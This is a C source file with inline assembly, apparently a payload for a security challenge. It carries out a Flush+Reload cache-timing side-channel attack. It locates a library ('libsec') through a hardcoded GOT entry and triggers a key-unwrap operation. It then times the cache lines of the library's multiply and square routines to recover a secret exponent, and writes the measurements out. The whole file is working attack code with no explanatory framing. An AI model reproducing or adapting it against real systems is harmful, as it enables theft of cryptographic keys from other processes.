
#define MYFUNC_DELC(name, rettype, args, value)  rettype (*name)args = (void*) value
#define MYFUNC_USE(name) MYFUNC_DELC_##name(name)

#define STR(str)                                \
({char* var = 0;                                \
  asm volatile( "  call after_string%=\n"       \
                "  .ascii \"" str "\"\n"        \
                "  .byte 0\n"                   \
                "after_string%=:\n"             \
                "  pop %0\n"                    \
                : "=m" (var) );                 \
  var; })

#define size_t unsigned int

/* Definitions of all functions & symbols */
#define MYFUNC_DELC_my_read(name)   MYFUNC_DELC(name, size_t, (int, char*, size_t), 0x400AF0)
#define MYFUNC_DELC_my_write(name)  MYFUNC_DELC(name, size_t, (int, char*, size_t), 0x400BC0)

#define loop()  asm __volatile__ ("loop: jmp loop")

#define SEC_fgetc_got               ((unsigned long long*) 0x601c98)
#define SEC_fgetc_offset_in_libsec  0x35f0

#define NB_MEASURES_MAX 50000
#define THRESHOLD 200
#define CYCLES_IN_FRAME 0x30000

#define HIT_MULTIPLY 1
#define HIT_SQUARE 0
#define HIT_NOTHING -1

int probe(char *adrs);
void my_send_all(int fd, char* data, size_t len);
unsigned long long rdtsc(void) ;

void _start() {
    MYFUNC_USE(my_write);

    char* str_unwrap_req = STR("3\n2\n0\n");
    char* fake_key = STR("0A3A0026963CB5816B7474AFD14E6D2C77312921D6E799F82FA8B534C8CF1BBA3519B025941A03FAD74D938ED3CD7AA0BFC0E7F5AF800B87F8FB103B7C8C1DF40364165FB5459BF6B5086CD56B831B23B90FEBEC277BC7BAF9B29D0EB2C9BBFA7D868610E20A02B4211A874D642FAFA763BB9CCD32994C0C562D02A9AC6955A544BE9CB81AC31539CF5871E2E6C3970345C6FDC9DA3EEA24904B23328D28851EF3FEBD33D6F729890D66567DE1\n");
    char* base_libsec = (void *) ( (* SEC_fgetc_got) - SEC_fgetc_offset_in_libsec);
    
    void * probbed_addr_multiply = base_libsec+0x3093;
    void * probbed_addr_square = base_libsec+0x3313;
    
    char measures[NB_MEASURES_MAX];
    
    unsigned long i = 0;
    unsigned long j = 0;
    unsigned long t = 0;
    
    register unsigned long long cycles;

    //unwrap
    my_send_all(4, str_unwrap_req, 6);
    my_send_all(4, fake_key, 348);

    //probe
    for(i = 0; i < NB_MEASURES_MAX; i++) {
        cycles = rdtsc();
        t = probe(probbed_addr_multiply);
        if(t < THRESHOLD) {
            measures[i] = HIT_MULTIPLY;
        } else {
            t = probe(probbed_addr_square);
            if(t < THRESHOLD) {
                measures[i] = HIT_SQUARE;
            } else {
                measures[i] = HIT_NOTHING;
            }
        }
        // sleep
        while( (rdtsc() - cycles) < CYCLES_IN_FRAME) {}
    }

    //send results
    //i = total nb of measures
    my_send_all(1, (void*) &i, sizeof(unsigned long));
    for(j = 0; j < i; j++) {
        my_send_all(1, (void*) &measures[j], sizeof(char));
    }

    loop();

}

unsigned long long rdtsc(void)
{
    unsigned long hi, lo;
    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
    return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
        " mfence \n"
        " lfence \n"
        " rdtsc \n"
        " lfence \n"
        " movl %%eax, %%esi \n"
        " movq (%1), %%rax \n"
        " lfence \n"
        " rdtsc \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1) \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

void my_send_all(int fd, char*data, size_t len) {
    MYFUNC_USE(my_write);
    size_t n = 0;
    while(n != len) {
        n += my_write(fd, &data[n], len-n);
    }
}

